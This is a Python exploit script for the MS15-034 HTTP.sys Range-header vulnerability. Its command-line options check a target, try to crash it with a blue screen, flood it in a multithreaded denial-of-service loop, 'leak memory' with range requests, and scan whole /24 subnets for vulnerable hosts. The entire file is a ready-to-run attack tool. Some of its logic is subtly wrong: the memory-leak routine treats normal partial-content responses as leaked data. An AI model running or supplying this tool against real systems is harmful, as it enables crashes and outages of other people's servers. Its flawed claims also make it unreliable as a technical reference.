#!/usr/bin/python3
import socket
import sys
import requests
import argparse
import threading
import queue
import time
from concurrent.futures import ThreadPoolExecutor

class MS15_034_Exploit:
    def __init__(self, target, port=80, ssl=False):
        self.target = target
        self.port = port
        self.ssl = ssl
        self.proto = "https" if ssl else "http"
        self.vulnerable = False
        self.chunk_size = 114
        self.timeout = 10
        
    def build_payload(self, range_start, range_end):
        """Build HTTP request with Range header"""
        payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Range: bytes={range_start}-{range_end}\r\n"
            f"Accept: */*\r\n"
            f"User-Agent: MS15-034 Exploit\r\n"
            f"\r\n"
        )
        return payload.encode()

    def check_vulnerability(self):
        """Check if target is vulnerable to MS15-034"""
        try:
            # Test with invalid range
            headers = {
                'Range': 'bytes=0-18446744073709551615',
                'User-Agent': 'MS15-034 Checker'
            }
            
            url = f"{self.proto}://{self.target}:{self.port}/"
            response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
            
            if response.status_code == 416:
                # Check for specific Microsoft HTTP.sys response
                if "Requested Range Not Satisfiable" in response.text:
                    self.vulnerable = True
                    print("[+] Target appears to be VULNERABLE!")
                    return True
                    
            print("[-] Target does not appear to be vulnerable")
            return False
            
        except requests.exceptions.RequestException as e:
            if "Read timed out" in str(e):
                print("[!] Connection timed out - target might be vulnerable or crashed")
                return True
            print(f"[-] Error checking vulnerability: {str(e)}")
            return False

    def trigger_bsod(self):
        """Trigger Blue Screen of Death on vulnerable systems"""
        if not self.vulnerable:
            print("[-] Target not confirmed vulnerable. Run check_vulnerability() first")
            return False

        try:
            # Create raw socket for more control
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            
            # Send malicious range header
            payload = self.build_payload(0, 18446744073709551615)
            s.send(payload)
            
            try:
                response = s.recv(1024)
                print("[*] Received response:", response)
            except socket.timeout:
                print("[+] Target might have crashed!")
                return True
                
        except Exception as e:
            print(f"[-] Error triggering BSOD: {str(e)}")
            return False
        finally:
            s.close()

    def memory_leak(self, start_range=0, end_range=2000):
        """Attempt to leak memory through range requests"""
        results = []
        
        for i in range(start_range, end_range, self.chunk_size):
            try:
                headers = {
                    'Range': f'bytes={i}-{i+self.chunk_size-1}',
                    'User-Agent': 'MS15-034 Memory Leak'
                }
                
                url = f"{self.proto}://{self.target}:{self.port}/"
                response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                
                if response.status_code == 206:  # Partial Content
                    results.append((i, response.content))
                    print(f"[+] Found interesting data at offset {i}")
                    
            except Exception as e:
                print(f"[-] Error at offset {i}: {str(e)}")
                continue
                
        return results

    def dos_attack(self, threads=10, duration=30):
        """Launch denial of service attack"""
        def worker(queue):
            while True:
                try:
                    if queue.empty():
                        break
                    
                    payload = self.build_payload(0, 18446744073709551615)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.target, self.port))
                    s.send(payload)
                    s.close()
                    
                except Exception:
                    continue

        start_time = time.time()
        work_queue = queue.Queue()
        
        # Fill queue with work
        for _ in range(threads * 100):
            work_queue.put(True)

        print(f"[*] Starting DoS attack with {threads} threads for {duration} seconds")
        
        while time.time() - start_time < duration:
            thread_list = []
            for _ in range(threads):
                t = threading.Thread(target=worker, args=(work_queue,))
                t.start()
                thread_list.append(t)
                
            for t in thread_list:
                t.join()
                
            # Refill queue
            for _ in range(threads * 100):
                work_queue.put(True)
                
        print("[*] DoS attack completed")

    def scan_network(self, network, threads=50):
        """Scan network range for vulnerable hosts"""
        def check_host(ip):
            try:
                exploit = MS15_034_Exploit(ip, self.port, self.ssl)
                if exploit.check_vulnerability():
                    return ip
            except:
                pass
            return None

        vulnerable_hosts = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i in range(1, 255):
                ip = f"{network}.{i}"
                futures.append(executor.submit(check_host, ip))
            
            for future in futures:
                result = future.result()
                if result:
                    vulnerable_hosts.append(result)
                    
        return vulnerable_hosts

def main():
    parser = argparse.ArgumentParser(description='MS15-034 HTTP.sys Exploit')
    parser.add_argument('-t', '--target', required=True, help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--ssl', action='store_true', help='Use HTTPS')
    parser.add_argument('--check', action='store_true', help='Only check if target is vulnerable')
    parser.add_argument('--bsod', action='store_true', help='Attempt to trigger BSOD')
    parser.add_argument('--dos', action='store_true', help='Launch DoS attack')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads for DoS')
    parser.add_argument('--duration', type=int, default=30, help='Duration of DoS attack in seconds')
    parser.add_argument('--leak', action='store_true', help='Attempt memory leak')
    parser.add_argument('--scan', help='Network to scan (e.g., 192.168.1)')
    
    args = parser.parse_args()

    exploit = MS15_034_Exploit(args.target, args.port, args.ssl)

    if args.scan:
        print(f"[*] Scanning network {args.scan}.0/24 for vulnerable hosts...")
        vulnerable = exploit.scan_network(args.scan)
        print("\nVulnerable hosts found:")
        for host in vulnerable:
            print(f"[+] {host}")
        return

    if args.check or args.bsod or args.dos or args.leak:
        if exploit.check_vulnerability():
            if args.bsod:
                exploit.trigger_bsod()
            if args.dos:
                exploit.dos_attack(args.threads, args.duration)
            if args.leak:
                results = exploit.memory_leak()
                if results:
                    print("\nLeaked memory chunks:")
                    for offset, data in results:
                        print(f"Offset {offset}: {data.hex()}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
